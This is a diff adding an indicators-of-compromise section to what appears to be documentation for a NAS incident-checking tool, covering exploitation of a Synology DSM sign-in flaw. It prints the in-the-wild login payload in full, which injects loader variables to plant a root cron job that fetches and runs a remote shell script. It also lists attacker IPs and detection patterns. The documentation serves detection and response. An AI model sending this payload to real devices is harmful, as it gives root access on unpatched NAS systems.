@@ -40,6 +40,49 @@ CVE-2024-10441 (an older DSM remote code execution flaw) has also been reported 
 - The NAS dials PPPoE itself or sits in the router's DMZ: it then holds a public IPv4 address with no NAT in front, and every service listens on it unless DSM's firewall drops it.
 - IPv6: a global IPv6 address on the NAS is reachable unless a firewall (router or DSM) drops inbound traffic.
 
+## Indicators of compromise and how `nas incident --deep` checks them
+
+Observed in the wild (2026-10-28): CVE-2024-10441 (Synology-SA-24:20, output-encoding flaw in the system plugin daemon) used through the DSM sign-in. The request is `SYNO.API.Auth` v7 `login` with this account field (newlines and tabs are real characters):
+
+```
+admin
+PLUGIN_VALUE_END
+LD_PRELOAD=PLUGIN_VALUE_START
+NOP
+*	*	*	*	*	root	echo	<base64 of "curl -s http://<IP>/xdy5.sh|sh">	|base64	-d|sh
+NOP
+PLUGIN_VALUE_END
+LD_DEBUG=libs
+LD_DEBUG_OUTPUT=/etc/cron.d/synot<xxx>
+ESCAPE=PLUGIN_VALUE_START
+NOP
+```
+
+The injected variables reach a plugin process; glibc's `LD_DEBUG` output, which contains the cron line, is written to `/etc/cron.d/synot<xxx>`, and cron then downloads and runs `xdy5.sh` as root every minute. Builds fixed for SA-24:20 are not affected by this request.
+
+| Indicator | Where | Item |
+|---|---|---|
+| `PLUGIN_VALUE_END`, `LD_PRELOAD=`, `LD_DEBUG_OUTPUT` in a sign-in | DSM connection log (`SYNO.Core.SyslogClient.Log`, about the last 10,000 entries) | `exploit_attempts` (normal session) |
+| The same strings, `POST weblogin Args: USER=...` with the payload | `/var/log/synoplugin.log*` (root only, rotated as `.xz`) | `exploit_attempts_logs` (`--deep`) |
+| "failed to sign in" event text with the payload | `/var/log/synoscgi.log*` (root only, `.xz`) | `exploit_attempts_logs` |
+| `authentication failure ... rhost=<IP>` without a `user=` field | `/var/log/auth.log*` (root only) | `exploit_attempts_logs` |
+| Source addresses `46.8.78.122`, `104.253.175.125` (`incident.ioc_ips`, extendable) | all of the above, connections | `exploit_attempts`, `exploit_attempts_logs`, `ioc_processes` |
+| `/etc/cron.d/synot*`, cron lines with `base64 -d`, `| sh`, `curl`/`wget`, `xdy5` | `/etc/crontab`, `/etc/cron.d`, `/var/spool/cron` | `ioc_cron` |
+| `/bin/libgld`, `/bin/qnetd`, `/bin/l0ck.enc`, any `xdy5*` file | `/bin`, `/usr/bin`, temp folders, `/etc`, `/root`, `/var/spool` (3 levels) | `ioc_binaries` |
+| A second uid 0 account; unknown accounts with uid >= 1024 | `/etc/passwd` (package accounts and `incident.allowed_users` excluded) | `ioc_users` |
+| `authorized_keys` for root or any home | `/root/.ssh`, `/var/services/homes/*/.ssh`, `/volume*/homes/*/.ssh` | `ioc_ssh_keys` |
+| Processes named `libgld`/`qnetd`/`xdy5*` or running from `/tmp`, `/var/tmp`, `/dev/shm`; executables outside Synology paths; established TCP connections to public addresses (reported), to IOC addresses (FAIL) | `/proc` | `ioc_processes` |
+
+Verdicts: known-bad hit = FAIL; unknown entries (cron lines outside Synology paths, accounts not allow-listed, executables outside Synology paths, `(deleted)` executables, any `authorized_keys`) = WARN; attempts in logs = WARN with "attempt seen". Container processes are counted, not judged. Log text is shown as data: control characters escaped, lengths capped; `--json` adds the collector's raw result under `deep`.
+
+How `--deep` runs:
+
+- `--backend password`: a temporary root task in Task Scheduler (`SYNO.Core.TaskScheduler.Root create` after `SYNO.Core.User.PasswordConfirm`, `run` v2, deleted afterwards) runs one Python script (zlib + base64 in the task script). It refuses a symlinked `deploy.stage_dir`, writes one file `<stage_dir>/nas-deep-<random>.json` with `O_CREAT|O_EXCL|O_NOFOLLOW`, carrying the random marker; the CLI reads it with File Station, checks the marker and deletes it. `deploy.stage_dir` must be set (a folder in a shared folder the account can write; created if missing).
+- `--backend local` (on the NAS as root): the same script runs directly and prints the JSON.
+- Nothing else is written; the script only reads.
+
+Equivalent by hand (as root): `xzcat -f /var/log/synoplugin.log* /var/log/synoscgi.log* /var/log/auth.log* | grep -E 'PLUGIN_VALUE_END|LD_DEBUG_OUTPUT|46\.8\.78\.122|104\.253\.175\.125'`, `ls -la /etc/cron.d /bin/libgld /bin/qnetd /bin/l0ck.enc`, `awk -F: '$3>=1024 || ($3==0 && $1!="root")' /etc/passwd`, `ls -la /root/.ssh /var/services/homes/*/.ssh`, `ls -l /proc/*/exe`, `cat /proc/net/tcp`.
+
 ## Checklist
 
 ### 1. Isolate (if anything looks encrypted)
